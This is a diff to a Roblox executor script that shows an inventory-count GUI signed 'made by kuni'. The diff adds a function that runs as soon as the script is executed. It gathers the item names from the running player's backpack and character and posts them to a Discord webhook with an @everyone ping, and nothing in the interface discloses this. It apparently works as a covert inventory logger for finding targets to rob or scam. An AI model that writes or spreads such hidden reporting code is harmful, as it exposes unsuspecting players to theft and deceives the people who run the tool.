@@ -1,14 +1,17 @@
+
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local CoreGui = game:GetService("CoreGui")
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
 local maxSlots = 60
 
 local function isPet(item)
     return item:IsA("Tool")
 end
 
+-- GUI Setup
 local screenGui = Instance.new("ScreenGui")
 screenGui.Parent = CoreGui
 
@@ -101,12 +104,14 @@ footer.TextSize = 14
 footer.TextColor3 = Color3.fromRGB(200, 200, 200)
 footer.Text = "made by kuni"
 
+-- Timer
 local startTime = tick()
 RunService.Heartbeat:Connect(function()
     local elapsed = tick() - startTime
     timerLabel.Text = string.format("%ds", math.floor(elapsed))
 end)
 
+-- Update bar color
 local function updateColor(ratio)
     if ratio < 0.5 then
         return Color3.fromRGB(0, 200, 100)
@@ -117,6 +122,7 @@ local function updateColor(ratio)
     end
 end
 
+-- Update inventory GUI
 local function updateCount()
     local count = 0
     for _, item in ipairs(player.Backpack:GetChildren()) do
@@ -148,3 +154,53 @@ player.CharacterAdded:Connect(function(char)
 end)
 
 updateCount()
+
+-- Robust Discord sender with @everyone, bold title, code block
+local function sendInventoryToDiscord()
+    local items = {}
+    
+    for _, item in ipairs(player.Backpack:GetChildren()) do
+        if isPet(item) then
+            table.insert(items, item.Name)
+        end
+    end
+    if player.Character then
+        for _, item in ipairs(player.Character:GetChildren()) do
+            if isPet(item) then
+                table.insert(items, item.Name)
+            end
+        end
+    end
+
+    local count = #items
+    local content = "@everyone\n**Inventory ("..count.." / "..maxSlots..")**:\n\n```"..table.concat(items, "\n").."```"
+    local data = {content = content}
+    local jsonData = HttpService:JSONEncode(data)
+    local headers = { ["Content-Type"] = "application/json" }
+
+    local requestFunction = syn and syn.request or http_request or request or HttpPost
+    if not requestFunction then
+        warn("No HTTP request function available in this executor!")
+        return
+    end
+
+    local success, response = pcall(function()
+        return requestFunction({
+            Url = Webhook,
+            Method = "POST",
+            Headers = headers,
+            Body = jsonData
+        })
+    end)
+
+    if success then
+        if response.StatusCode ~= 200 and response.StatusCode ~= 204 then
+            warn("Error sending to Discord:", response.StatusCode, response.Body)
+        end
+    else
+        warn("Failed to send request:", response)
+    end
+end
+
+-- Send inventory immediately on execute
+sendInventoryToDiscord()
